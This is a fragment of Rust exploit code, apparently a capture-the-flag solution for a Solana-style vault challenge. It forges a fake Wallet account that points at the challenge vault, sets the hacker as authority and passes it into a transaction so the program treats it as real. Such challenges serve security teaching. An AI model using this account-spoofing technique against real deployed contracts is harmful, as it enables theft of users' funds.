...
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    ...
    let fake_wallet = keypair(111);
    let mut fake_wallet_data: Vec<u8> = vec![];
    let fake_wallet_struct = Wallet {
        vault: challenge.vault_address,
        authority: challenge.hacker.pubkey()
    };

    fake_wallet_struct.serialize(&mut fake_wallet_data).unwrap();
    env.create_account_with_data(&fake_wallet, fake_wallet_data);
    ...
    env.execute_as_transaction(
        &[Instruction {
            ...
            accounts: vec![
                ...
                AccountMeta::new(fake_wallet_struct.vault, false),
                AccountMeta::new(fake_wallet_struct.authority, true),
                AccountMeta::new(fake_wallet_struct.authority, false),
